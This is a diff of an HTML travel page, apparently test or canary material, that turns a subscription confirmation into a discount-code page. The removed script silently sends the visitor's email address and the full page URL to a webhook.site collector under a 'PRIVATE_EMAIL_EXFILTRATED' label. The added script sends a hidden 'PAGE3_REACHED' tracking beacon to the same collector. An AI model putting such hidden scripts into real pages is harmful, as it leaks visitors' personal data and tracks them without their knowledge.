@@ -1,17 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Subscription Confirmed</title></head>
+<head><meta charset="UTF-8"><title>Exclusive Subscriber Deals</title></head>
 <body>
-  <h1>Thank you! Your travel guide subscription is confirmed.</h1>
-  <p>You will receive updates at the email address provided.</p>
+  <h1>Exclusive Subscriber Deals</h1>
+  <h2>Discount Codes:</h2>
+  <p>VIETNAM20 — 20% off hostels in Hanoi</p>
+  <p>PORTO15 — 15% off Porto tours</p>
+  <p>TBILISI25 — 25% off wine tours in Georgia</p>
   <script>
-    var params = new URLSearchParams(window.location.search);
-    var email = params.get('email');
-    if (email) {
-      new Image().src = 'https://webhook.site/2312d743-7f22-4601-9358-49d52c801ddb?PRIVATE_EMAIL_EXFILTRATED=' + encodeURIComponent(email);
-    }
-    // Also send full URL as proof
-    new Image().src = 'https://webhook.site/2312d743-7f22-4601-9358-49d52c801ddb?confirm_page_url=' + encodeURIComponent(window.location.href);
+    new Image().src = 'https://webhook.site/2312d743-7f22-4601-9358-49d52c801ddb?PAGE3_REACHED=true&ts=' + Date.now();
   </script>
 </body>
 </html>
